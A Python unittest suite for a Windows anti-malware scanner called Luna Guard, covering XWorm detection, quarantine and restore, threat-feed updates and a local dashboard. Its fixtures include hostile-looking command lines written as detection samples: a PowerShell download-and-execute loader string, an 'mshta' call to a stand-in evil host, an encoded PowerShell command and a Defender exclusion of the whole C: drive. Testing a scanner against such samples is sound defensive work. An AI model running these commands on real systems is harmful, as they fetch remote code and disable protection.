"""36 test cases ของ Luna Guard  (รัน: python -m unittest -v test_luna)
ส่วนที่เป็นคำสั่ง Windows (netstat/schtasks/ipconfig/registry) จำลองผลลัพธ์ด้วย mock - ไฟล์/แฮช/YARA/กักกัน/ฐานข้อมูลทดสอบจริง"""
import argparse, contextlib, hashlib, io, json, os, struct, sys, tempfile, threading, unittest, zipfile
from pathlib import Path
from unittest import mock
from urllib.error import HTTPError
from urllib.request import Request, urlopen

ROOT = Path(tempfile.mkdtemp(prefix="lg_"))
os.environ.update(LOCALAPPDATA=str(ROOT / "local"), APPDATA=str(ROOT / "AppData"), TEMP=str(ROOT / "AppData/Temp"),
                  WINDIR=str(ROOT / "Windows"), PROGRAMDATA=str(ROOT / "PD"), ABUSECH_KEY="test-key")
sys.path.insert(0, str(Path(__file__).resolve().parent))
import luna_guard as lg
import luna_dashboard as dashboard
import luna_app as app

XW = b"MZ" + b"\0" * 60 + b"mscoree.dll BSJB " + "<Xwormmm>".encode("utf-16le") + b" Xklog\0" * 20
TMP = ROOT / "AppData/Temp"; TMP.mkdir(parents=True)
CMDS, OUT = [], {"netstat": "", "sch": "", "dns": "", "procs": "[]"}


class FakeReg:
    HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, KEY_SET_VALUE = "HKCU", "HKLM", 2
    data = {("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run"): {}}
    class K:
        def __init__(s, d): s.d = d
        def __enter__(s): return s
        def __exit__(s, *a): pass
    @classmethod
    def OpenKey(c, h, sub, r=0, a=0):
        if (h, sub) not in c.data: raise OSError
        return c.K(c.data[(h, sub)])
    @staticmethod
    def EnumValue(k, i):
        it = list(k.d.items())
        if i >= len(it): raise OSError
        return it[i][0], it[i][1], 1
    @staticmethod
    def DeleteValue(k, n): del k.d[n]


def fake_run(cmd):
    CMDS.append(cmd); c = cmd[0].lower()
    return {"netstat": OUT["netstat"], "ipconfig": OUT["dns"], "powershell": OUT["procs"]}.get(c, OUT["sch"] if c == "schtasks" and cmd[1] == "/query" else "")


lg.run, lg.winreg = fake_run, FakeReg
RUNKEY = ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run")


def scan(clean=False, paths=None, files_only=False):
    buf = io.StringIO()
    with mock.patch.object(lg, "scan_process_memory", return_value=[]), contextlib.redirect_stdout(buf):
        lg.cmd_scan(argparse.Namespace(
            clean=clean, files_only=files_only, full=False,
            paths=None if files_only else (paths or [str(TMP)]),
        ))
    return buf.getvalue(), lg.LAST_SCAN


def sev(res, kind): return [f["sev"] for f in res["findings"] if f["kind"] == kind]


class T(unittest.TestCase):
    def setUp(self):
        for f in TMP.glob("*"): f.unlink()
        (Path(os.environ["APPDATA"]) / r"Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt").unlink(missing_ok=True)
        case_dir = ROOT / self._testMethodName; case_dir.mkdir(exist_ok=True)
        lg.APP_DIR = case_dir; lg.DB_PATH = case_dir / "threats.db"
        lg.QUAR_DIR = case_dir / "quarantine"; lg.QUAR_INDEX = lg.QUAR_DIR / "index.json"
        lg.CONFIG = case_dir / "config.json"; lg.HISTORY = case_dir / "history.json"
        dashboard.LANGUAGE_FILE = case_dir / "settings.json"
        dashboard.DEFENDER_STATUS.update(checked=0.0, value={"available": False})
        lg.LAST_SCAN.clear()
        lg.SCAN_AUDIT.clear()
        CMDS.clear(); FakeReg.data[RUNKEY].clear(); OUT.update(netstat="", sch="", dns="", procs="[]")

    def test01_hash_match(self):
        f = TMP / "a.exe"; f.write_bytes(b"MZ" + b"Z" * 300)
        con = lg.db()
        con.execute("INSERT OR REPLACE INTO hashes VALUES(?,?,?)", (hashlib.sha256(f.read_bytes()).hexdigest(), "XWorm", "test"))
        con.commit(); con.close()
        _, r = scan(); self.assertEqual(sev(r, "ไฟล์"), ["high"])

    def test02_yara_xworm_sample(self):
        (TMP / "b.exe").write_bytes(XW); out, r = scan()
        self.assertEqual(sev(r, "ไฟล์"), ["high"]); self.assertIn("YARA: LunaGuard_XWorm_Strong", out)

    def test03_no_false_positive(self):
        (TMP / "ok.exe").write_bytes(b"MZ" + b"A" * 500); (TMP / "n.txt").write_text("xworm article")
        (TMP / "dotnet.exe").write_bytes(b"MZ" + b"\0" * 20 + b"mscoree.dll BSJB" + b"x" * 200)
        _, r = scan(); self.assertEqual(r["findings"], [])

    def test04_system_name_mimic(self):
        (TMP / "csrss.exe").write_bytes(XW); _, r = scan(); self.assertEqual(sev(r, "ไฟล์"), ["high"])

    def test37_wmpnscfg_name_alone_is_not_suspicious(self):
        (TMP / "wmpnscfg.exe").write_bytes(b"MZ" + b"ordinary signed program " * 30)
        _, result = scan()
        self.assertEqual(result["findings"], [])

    def test38_generic_xworm_marker_cannot_be_high(self):
        path = TMP / "vivoxsdk.dll"
        path.write_bytes(b"MZ" + b"\0" * 60 + b"mscoree.dll BSJB xworm")
        con = lg.db()
        with mock.patch.object(lg, "yara_scan_file", return_value=[]):
            severity, reasons, _ = lg.analyze(str(path), con)
        con.close()
        self.assertEqual(severity, "medium")
        self.assertTrue(any("ยังไม่ยืนยัน" in reason for reason in reasons))

    def test39_default_scan_roots_are_focused_and_deduplicated(self):
        home = ROOT / "focused-home"
        appdata = home / "Roaming"
        temp = home / "Local" / "Temp"
        downloads = home / "Downloads"
        startup = appdata / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        for directory in (temp, appdata, downloads, startup):
            directory.mkdir(parents=True, exist_ok=True)
        env = {"TEMP": str(temp), "APPDATA": str(appdata), "LOCALAPPDATA": str(home / "Local")}
        with mock.patch.dict(os.environ, env), mock.patch.object(Path, "home", return_value=home):
            roots = lg.default_scan_dirs()
        self.assertEqual(roots, [str(temp), str(appdata), str(downloads)])
        self.assertFalse(any(str(home / "Local") == root for root in roots))

    def test40_file_only_scan_skips_system_checks_and_records_scope(self):
        (TMP / "ordinary.exe").write_bytes(b"MZ" + b"ordinary content " * 20)
        rules = mock.Mock()
        rules.match.return_value = []
        skipped_checks = (
            "list_processes", "scan_process_memory", "registry_run_entries",
            "scheduled_tasks", "network_hits", "dns_hits", "powershell_history",
        )
        with mock.patch.object(lg, "default_scan_dirs", return_value=[str(TMP)]), \
                mock.patch.object(lg, "yara_rules", return_value=rules), \
                contextlib.ExitStack() as stack:
            checks = {name: stack.enter_context(mock.patch.object(lg, name)) for name in skipped_checks}
            output, result = scan(files_only=True)
        self.assertEqual(result["scope"], "files")
        self.assertEqual(result["files"], 1)
        self.assertIn("ข้ามการตรวจ process, memory", output)
        for check in checks.values():
            check.assert_not_called()
        history = json.loads(lg.HISTORY.read_text(encoding="utf-8"))
        self.assertEqual(history[-1]["scope"], "files")

    def test41_dashboard_starts_file_only_mode_and_rejects_conflicting_options(self):
        server = dashboard.ThreadingHTTPServer(("127.0.0.1", 0), dashboard.H)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        base = f"http://127.0.0.1:{server.server_address[1]}/api/scan"

        def post(payload):
            request = Request(
                base, data=json.dumps(payload).encode("utf-8"),
                headers={"X-T": dashboard.TOKEN, "Content-Type": "application/json"},
                method="POST",
            )
            try:
                with urlopen(request, timeout=5) as response:
                    return response.status, json.loads(response.read())
            except HTTPError as error:
                try:
                    return error.code, json.loads(error.read())
                finally:
                    error.close()

        jobs = []
        try:
            with mock.patch.object(
                dashboard, "start",
                side_effect=lambda name, job: jobs.append((name, job)) or True,
            ) as start:
                status, response = post({"files_only": True})
                self.assertEqual((status, response["ok"]), (200, True))
                self.assertEqual(jobs[0][0], "สแกนไฟล์แบบอัตโนมัติ")
                with mock.patch.object(lg, "cmd_scan") as cmd_scan:
                    jobs[0][1]()
                    self.assertTrue(cmd_scan.call_args.args[0].files_only)
                    self.assertFalse(cmd_scan.call_args.args[0].clean)

                status, response = post({"files_only": True, "clean": True})
                self.assertEqual(status, 400)
                self.assertIn("read-only", response["error"])
                status, response = post({"files_only": True, "paths": [str(TMP)]})
                self.assertEqual(status, 400)
                status, response = post({"files_only": True, "full": True})
                self.assertEqual(status, 400)
                self.assertEqual(start.call_count, 1)
        finally:
            server.shutdown()
            server.server_close()
            thread.join(timeout=5)

    def test05_powershell_loader_is_medium_not_cleaned(self):
        f = TMP / "l.ps1"; f.write_bytes(b'x.DownloadString("http://a");[Convert]::FromBase64String($a);-WindowStyle Hidden')
        _, r = scan(clean=True); self.assertEqual(sev(r, "ไฟล์"), ["medium"]); self.assertTrue(f.exists())

    def test06_powershell_history(self):
        h = Path(os.environ["APPDATA"]) / r"Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"; h.parent.mkdir(parents=True, exist_ok=True)
        h.write_text("dir\nmshta https://evil.example/c\npowershell -enc " + "QQ" * 20 + "\nAdd-MpPreference -ExclusionPath C:\\\n")
        _, r = scan(); self.assertEqual(len(sev(r, "PowerShell")), 3)

    def test07_c2_connection(self):
        con = lg.db(); con.execute("INSERT OR REPLACE INTO iocs VALUES('45.67.89.10','ip','XWorm','test')"); con.commit(); con.close()
        OUT["netstat"] = "  TCP    10.0.0.5:50123    45.67.89.10:7000    ESTABLISHED    4321\n  TCP    10.0.0.5:50124    8.8.8.8:443    ESTABLISHED    999\n"
        _, r = scan(); self.assertEqual(sev(r, "เครือข่าย"), ["high"])

    def test08_scam_domain_dns(self):
        OUT["dns"] = "Record Name . . . : beastxm.com\nRecord Name . . . : www.google.com\n"
        _, r = scan(); self.assertEqual(sev(r, "DNS/hosts"), ["medium"])
        self.assertIn("beastxm.com", r["findings"][0]["target"])

    def test09_update_from_abuse_ch(self):
        def fake_http(url, data=None, headers=None, timeout=0):
            self.assertEqual((headers or {}).get("Auth-Key"), "test-key")
            if "mb-api" in url: return json.dumps({"query_status": "ok", "data": [{"sha256_hash": "AB" * 32}]}).encode()
            if "threatfox" in url:
                self.assertEqual(json.loads(data)["query"], "get_iocs")
                return json.dumps({"query_status": "ok", "data": [
                    {"ioc": "1.2.3.4:7000", "ioc_type": "ip:port",
                     "malware_samples": [{"sha256_hash": "CD" * 32}]},
                    {"ioc": "http://c2.example/x", "ioc_type": "url", "malware": "win.other"},
                ]}).encode()
            return b"# c\n127.0.0.1\tbad.example\n"
        old, lg.http = lg.http, fake_http
        with contextlib.redirect_stdout(io.StringIO()): lg.cmd_update()
        lg.http = old; con = lg.db()
        self.assertEqual(con.execute("SELECT COUNT(*) FROM hashes WHERE sha256=?", ("ab" * 32,)).fetchone()[0], 1)
        self.assertEqual(con.execute("SELECT COUNT(*) FROM hashes WHERE sha256=?", ("cd" * 32,)).fetchone()[0], 1)
        for v in ("1.2.3.4", "c2.example", "bad.example"): self.assertEqual(con.execute("SELECT COUNT(*) FROM iocs WHERE value=?", (v,)).fetchone()[0], 1)
        con.close()

    def test10_end_to_end_clean_and_restore(self):
        f = TMP / "csrss.exe"; f.write_bytes(XW); p = str(f)
        FakeReg.data[RUNKEY]["Updater"] = f'"{p}" /s'
        OUT["sch"] = '"HOST","\\\\SvcUpdate","N/A","Ready","x","N/A","0","N/A","N/A","' + p + '","x"\n'
        OUT["procs"] = json.dumps([{"ProcessId": 4321, "Name": "csrss.exe", "ExecutablePath": p}])
        _, r = scan(clean=True)
        self.assertFalse(f.exists()); self.assertEqual(FakeReg.data[RUNKEY], {})
        self.assertIn(["taskkill", "/F", "/PID", "4321"], CMDS); self.assertTrue(any(c[:2] == ["schtasks", "/delete"] for c in CMDS))
        qid = next(iter(lg.load_index())); _, r2 = scan(); self.assertEqual([x for x in r2["findings"] if x["sev"] == "high"], [])
        with contextlib.redirect_stdout(io.StringIO()):
            lg.cmd_restore(argparse.Namespace(id=qid))
        self.assertTrue(f.exists())

    def test11_medium_asks_user_then_quarantine(self):
        f = TMP / "l.ps1"; f.write_bytes(b'x.DownloadString("http://a");[Convert]::FromBase64String($a);-WindowStyle Hidden')
        scan(clean=True); self.assertTrue(f.exists())            # --clean ไม่แตะ MEDIUM
        with contextlib.redirect_stdout(io.StringIO()):
            qid = lg.remove_finding(str(f))                      # ผู้ใช้กด "กักกัน" เอง
            self.assertFalse(f.exists()); lg.cmd_restore(argparse.Namespace(id=qid))
        self.assertTrue(f.exists())

    def test12_allowlist_and_path_safety(self):
        f = TMP / "l2.ps1"; f.write_bytes(b'#2 x.DownloadString("http://a");[Convert]::FromBase64String($a);-WindowStyle Hidden')
        _, r = scan(); self.assertEqual(sev(r, "ไฟล์"), ["medium"])
        with contextlib.redirect_stdout(io.StringIO()): lg.allow_file(str(f))     # ผู้ใช้กด "ปลอดภัย"
        _, r = scan(); self.assertEqual(r["findings"], [])
        with self.assertRaises(SystemExit): lg.remove_finding("/etc/passwd")      # ลบไฟล์นอกผลสแกนไม่ได้

    def test13_low_severity(self):
        f = TMP / "h.ps1"; f.write_bytes(b"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File a.ps1")
        _, r = scan(clean=True); self.assertEqual(sev(r, "ไฟล์"), ["low"]); self.assertTrue(f.exists())

    def test14_progress_log_and_skip_filters(self):
        (TMP / "Cache").mkdir(exist_ok=True); (TMP / "Cache/x.exe").write_bytes(XW)   # โฟลเดอร์แคช ข้าม
        (TMP / "data.bin").write_bytes(b"not a program " * 50)                          # ไม่ใช่ MZ ข้าม
        out, r = scan(); self.assertEqual(r["findings"], []); self.assertEqual(lg.PROGRESS, {})
        for t in ("▶ [1/1] เริ่ม:", "✔ จบ:", "รวมตรวจ 1 ไฟล์", "[5/5]"): self.assertIn(t, out)
        (TMP / "Cache/x.exe").unlink(); (TMP / "Cache").rmdir()

    def test15_stop_button(self):
        for n in "abc": (TMP / f"{n}.exe").write_bytes(b"MZ" + n.encode() * 200)
        real = lg.analyze
        def stopper(path, con): lg.STOP["flag"] = True; return real(path, con)
        lg.analyze = stopper
        try: out, _ = scan()
        finally: lg.analyze = real
        self.assertIn("หยุดสแกนไฟล์", out); self.assertIn("รวมตรวจ 1 ไฟล์", out)

    def test16_scan_history_persists_details_and_last_result(self):
        f = TMP / "loader.ps1"
        f.write_bytes(b'x.DownloadString("http://a");[Convert]::FromBase64String($a);-WindowStyle Hidden')
        _, result = scan()
        saved = json.loads(lg.HISTORY.read_text(encoding="utf-8"))[-1]
        self.assertEqual(saved["time"], result["time"])
        self.assertTrue(os.path.samefile(saved["findings"][0]["target"], str(f)))
        self.assertEqual(saved["medium"], 1)
        lg.LAST_SCAN.clear()
        self.assertEqual(dashboard.state()["last"]["time"], saved["time"])
        self.assertEqual(dashboard.state()["last"]["findings"], saved["findings"])

    def test17_threatfox_dict_data_is_normalized(self):
        def fake_http(url, data=None, headers=None, timeout=0):
            if "mb-api" in url:
                return json.dumps({"query_status": "no_results", "data": []}).encode()
            if "threatfox" in url:
                return json.dumps({"query_status": "ok", "data": {
                    "item": {"ioc": "c2.example", "ioc_type": "domain", "malware_printable": "XWorm"}
                }}).encode()
            return b""
        old, lg.http = lg.http, fake_http
        try:
            out = io.StringIO()
            with contextlib.redirect_stdout(out): lg.cmd_update()
        finally:
            lg.http = old
        con = lg.db()
        self.assertEqual(con.execute("SELECT family FROM iocs WHERE value='c2.example'").fetchone()[0], "XWorm")
        self.assertNotIn("string indices must be integers", out.getvalue())
        self.assertEqual(lg.norm_ioc("a" * 64, "sha256_hash"), ("", ""))
        con.close()

    def test18_update_retries_gateway_error(self):
        import urllib.error
        calls = []
        old = lg.http
        def flaky(*args, **kwargs):
            calls.append(1)
            if len(calls) == 1:
                error = urllib.error.HTTPError(args[0], 502, "Bad Gateway", {}, io.BytesIO())
                error.close()
                raise error
            return b"ok"
        lg.http = flaky
        try:
            self.assertEqual(lg.update_http("https://feed.example"), b"ok")
        finally:
            lg.http = old
        self.assertEqual(len(calls), 2)

    def test19_failed_update_does_not_advance_timestamp(self):
        con = lg.db()
        con.execute("INSERT OR REPLACE INTO meta VALUES('last_update','old-time')")
        con.commit(); con.close()
        old = lg.http
        def offline(*args, **kwargs): raise OSError("offline")
        lg.http = offline
        try:
            out = io.StringIO()
            with contextlib.redirect_stdout(out): lg.cmd_update()
        finally:
            lg.http = old
        con = lg.db()
        self.assertEqual(con.execute("SELECT v FROM meta WHERE k='last_update'").fetchone()[0], "old-time")
        self.assertIn("ทุกแหล่งข้อมูลล้มเหลว", out.getvalue())
        con.close()

    def test20_missing_webview_does_not_launch_browser_or_server(self):
        with mock.patch.object(app, "load_webview", return_value=None), \
                mock.patch.object(app, "show_dependency_error") as show_error, \
                mock.patch.object(app, "serve") as serve:
            self.assertEqual(app.main(), 1)
        show_error.assert_called_once_with()
        serve.assert_not_called()

    def test21_language_setting_persists_and_preserves_other_settings(self):
        dashboard.set_language("en")
        self.assertEqual(dashboard.get_language(), "en")
        dashboard.LANGUAGE_FILE.write_text(json.dumps({"theme": "dark"}), encoding="utf-8")
        dashboard.set_language("zh-CN")
        self.assertEqual(json.loads(dashboard.LANGUAGE_FILE.read_text(encoding="utf-8")),
                         {"theme": "dark", "language": "zh-CN"})

    def test22_unsupported_language_is_rejected(self):
        for language in ("fr", None, []):
            with self.subTest(language=language), self.assertRaises(ValueError):
                dashboard.set_language(language)

    def test23_locale_bundles_have_matching_keys(self):
        locales = json.loads((Path(__file__).resolve().parent / "locales.json").read_text(encoding="utf-8"))
        self.assertEqual(set(locales), {"th", "en", "zh-CN"})
        expected = set(locales["th"])
        self.assertTrue(all(set(translations) == expected for translations in locales.values()))

    def test24_corrupt_language_settings_can_be_replaced(self):
        dashboard.LANGUAGE_FILE.write_text("{invalid json", encoding="utf-8")
        dashboard.set_language("en")
        self.assertEqual(dashboard.get_language(), "en")

    def test25_logo_is_served_to_the_desktop_ui(self):
        logo_path = Path(__file__).resolve().parent / "logo" / "Luna_Guard.png"
        expected = logo_path.read_bytes()
        self.assertEqual(expected[25], 6, "logo PNG must include an alpha channel")
        server = dashboard.ThreadingHTTPServer(("127.0.0.1", 0), dashboard.H)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        try:
            page_url = f"http://127.0.0.1:{server.server_address[1]}/?t={dashboard.TOKEN}"
            with urlopen(page_url, timeout=5) as response:
                page = response.read().decode("utf-8")
            self.assertIn('id="brandLogo"', page)
            self.assertIn(".brand-logo{width:52px;height:52px", page)
            self.assertIn('width="52" height="52"', page)
            self.assertIn("logo.src='/logo/Luna_Guard.png?t='+encodeURIComponent(T||'')", page)
            self.assertNotIn('src="/logo/Luna_Guard.png"', page)
            url = f"http://127.0.0.1:{server.server_address[1]}/logo/Luna_Guard.png?t={dashboard.TOKEN}"
            with urlopen(url, timeout=5) as response:
                self.assertEqual(response.headers.get_content_type(), "image/png")
                self.assertEqual(response.read(), expected)
        finally:
            server.shutdown()
            server.server_close()
            thread.join(timeout=5)

    def test26_nested_zip_finding_can_be_quarantined_and_restored(self):
        inner = io.BytesIO()
        with zipfile.ZipFile(inner, "w", zipfile.ZIP_DEFLATED) as nested:
            nested.writestr("payload.exe", XW)
        outer_path = TMP / "bundle.zip"
        with zipfile.ZipFile(outer_path, "w", zipfile.ZIP_DEFLATED) as outer:
            outer.writestr("nested.zip", inner.getvalue())

        _, result = scan(clean=True)
        finding = next(item for item in result["findings"] if item["kind"] == "Archive member")
        self.assertEqual(finding["sev"], "high")
        self.assertIn("nested.zip!payload.exe", finding["target"])
        self.assertTrue(outer_path.exists(), "automatic remediation must not replace an archive")
        with contextlib.redirect_stdout(io.StringIO()):
            qid = lg.remove_finding(str(outer_path))
            lg.cmd_restore(argparse.Namespace(id=qid))
        self.assertTrue(outer_path.exists())

    def test27_archive_scans_more_than_one_thousand_members(self):
        archive_path = TMP / "many-members.zip"
        with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as archive:
            for index in range(1001):
                archive.writestr(f"item-{index}.txt", b"ordinary data")
            archive.writestr("payload.exe", XW)
        _, result = scan()
        self.assertTrue(result["complete"])
        self.assertTrue(any(
            item["kind"] == "Archive member" and item["target"].endswith("payload.exe")
            for item in result["findings"]
        ))

    def test34_archive_scans_nested_archives_beyond_two_levels(self):
        content = io.BytesIO()
        with zipfile.ZipFile(content, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("payload.exe", XW)
        for _ in range(4):
            nested = io.BytesIO()
            with zipfile.ZipFile(nested, "w", zipfile.ZIP_DEFLATED) as archive:
                archive.writestr("nested.zip", content.getvalue())
            content = nested
        archive_path = TMP / "deep-nesting.zip"
        archive_path.write_bytes(content.getvalue())
        _, result = scan()
        finding = next(item for item in result["findings"] if item["kind"] == "Archive member")
        self.assertTrue(result["complete"])
        self.assertEqual(finding["sev"], "high")
        self.assertGreaterEqual(finding["target"].count("nested.zip"), 4)

    def test35_large_expanded_archive_member_is_streamed_and_cleaned_up(self):
        archive_path = TMP / "large-expanded.zip"
        zero_block = bytes(1024 * 1024)
        with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as archive:
            with archive.open("large.ps1", "w") as member:
                for _ in range(257):
                    member.write(zero_block)

        created = []
        named_temporary_file = lg.tempfile.NamedTemporaryFile

        def tracked_temporary_file(**kwargs):
            kwargs["dir"] = TMP
            temporary_file = named_temporary_file(**kwargs)
            created.append(Path(temporary_file.name))
            return temporary_file

        with mock.patch.object(lg.tempfile, "NamedTemporaryFile", side_effect=tracked_temporary_file), \
                mock.patch.object(lg, "yara_scan_file", return_value=[]):
            _, result = scan()
        self.assertTrue(result["complete"])
        self.assertTrue(created)
        self.assertTrue(all(not temporary_file.exists() for temporary_file in created))

    def test36_archive_temp_storage_failure_marks_scan_incomplete(self):
        archive_path = TMP / "temp-storage-failure.zip"
        with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("payload.exe", XW)
        with mock.patch.object(lg.tempfile, "NamedTemporaryFile", side_effect=OSError("disk full")):
            output, result = scan()
        self.assertFalse(result["complete"])
        self.assertGreater(result["issues"], 0)
        self.assertIn("disk full", output)

    def test28_defender_status_and_scan_commands_are_validated(self):
        completed = __import__("subprocess").CompletedProcess(
            args=[], returncode=0,
            stdout=json.dumps({"available": True, "antivirus": True, "realtime": True, "behavior": True}),
            stderr="",
        )
        with mock.patch.object(dashboard.lg, "IS_WIN", True), \
                mock.patch.object(dashboard.subprocess, "run", return_value=completed) as run:
            status = dashboard.defender_status(force=True)
            self.assertTrue(status["realtime"])
            dashboard.start_defender_scan("quick")
            self.assertIn("QuickScan", run.call_args.args[0][-1])
            with self.assertRaises(ValueError):
                dashboard.start_defender_scan("arbitrary")
        self.assertEqual(run.call_count, 2)

    def test29_macro_enabled_office_archives_are_inspected(self):
        office_path = TMP / "report.docm"
        with zipfile.ZipFile(office_path, "w", zipfile.ZIP_DEFLATED) as office:
            office.writestr("payload.exe", XW)
        _, result = scan()
        finding = next(item for item in result["findings"] if item["kind"] == "Archive member")
        self.assertEqual(finding["sev"], "high")
        self.assertEqual(finding["container"], str(office_path))

    def test30_luna_logo_is_embedded_as_the_executable_icon(self):
        root = Path(__file__).resolve().parent
        icon = (root / "logo" / "Luna_Guard.ico").read_bytes()
        reserved, image_type, count = struct.unpack_from("<HHH", icon)
        self.assertEqual((reserved, image_type, count), (0, 1, 6))
        sizes = []
        for index in range(count):
            width, height, _, _, planes, bits, length, offset = struct.unpack_from("<BBBBHHII", icon, 6 + index * 16)
            sizes.append((width or 256, height or 256))
            self.assertEqual((planes, bits), (1, 32))
            self.assertEqual(icon[offset:offset + 8], b"\x89PNG\r\n\x1a\n")
            self.assertEqual(icon[offset + 25], 6, "ICO PNG frames must preserve transparency")
            self.assertLessEqual(offset + length, len(icon))
        self.assertEqual(sizes, [(256, 256), (128, 128), (64, 64), (48, 48), (32, 32), (16, 16)])
        build_script = (root / "build.bat").read_text(encoding="utf-8")
        self.assertTrue(any(
            "--icon" in line and "Luna_Guard.ico" in line
            for line in build_script.splitlines()
        ))
        self.assertIn('--icon "logo/Luna_Guard.ico"', (root / ".github" / "workflows" / "windows.yml").read_text(encoding="utf-8"))

    def test31_large_files_are_scanned_without_the_old_size_cap(self):
        large = TMP / "large.exe"
        with large.open("wb") as stream:
            stream.write(b"MZ")
            stream.truncate(50 * 1024 * 1024 + 1)
        con = lg.db()
        severity, reasons, digest = lg.analyze(str(large), con)
        con.close()
        self.assertIsNone(severity)
        self.assertEqual(reasons, [])
        self.assertEqual(len(digest), 64)

    def test32_memory_scan_checks_every_process_and_reports_denials(self):
        class FakeMatch:
            rule = "MemoryThreat"
            meta = {"severity": "high"}

        def fake_match(pid):
            if pid == 101:
                raise PermissionError("access denied")
            return [FakeMatch()] if pid == 100 else []

        lg.SCAN_AUDIT.clear()
        output = io.StringIO()
        with mock.patch.object(lg, "yara_rules", return_value=object()), \
                mock.patch.object(lg, "yara_scan_process", side_effect=fake_match), \
                mock.patch.object(lg.os, "getpid", return_value=99), \
                contextlib.redirect_stdout(output):
            findings = lg.scan_process_memory([
                {"ProcessId": 100, "Name": "sample.exe"},
                {"ProcessId": 101, "Name": "protected.exe"},
                {"ProcessId": 99, "Name": "LunaGuard.exe"},
            ])
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["kind"], "หน่วยความจำ")
        self.assertIn("PID 100", findings[0]["target"])
        self.assertEqual(lg.SCAN_AUDIT["memory"], {"attempted": 2, "scanned": 1, "denied": 1, "failed": 0})
        self.assertEqual(lg.SCAN_AUDIT["issues"], 1)
        self.assertIn("PID 101", output.getvalue())

    def test33_incomplete_memory_scan_cannot_report_clean(self):
        OUT["procs"] = json.dumps([{"ProcessId": 202, "Name": "protected.exe"}])
        with mock.patch.object(lg, "yara_scan_process", side_effect=PermissionError("access denied")), \
                contextlib.redirect_stdout(io.StringIO()):
            lg.cmd_scan(argparse.Namespace(clean=False, full=False, paths=[str(TMP)]))
        self.assertFalse(lg.LAST_SCAN["complete"])
        self.assertEqual(lg.LAST_SCAN["issues"], 1)
        saved = json.loads(lg.HISTORY.read_text(encoding="utf-8"))[-1]
        self.assertFalse(saved["complete"])
        self.assertEqual(saved["audit"]["memory"]["denied"], 1)


if __name__ == "__main__":
    unittest.main(verbosity=2)
